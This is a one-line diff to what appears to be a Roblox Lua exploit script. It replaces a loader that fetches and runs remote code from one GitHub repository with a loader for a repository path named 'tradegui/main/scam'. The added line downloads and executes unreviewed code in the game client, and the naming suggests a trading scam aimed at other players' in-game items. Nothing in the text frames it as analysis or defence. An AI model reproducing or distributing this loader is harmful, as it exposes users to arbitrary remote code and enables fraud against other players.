@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/premiumscripts/tradegui/main/scam", true))()
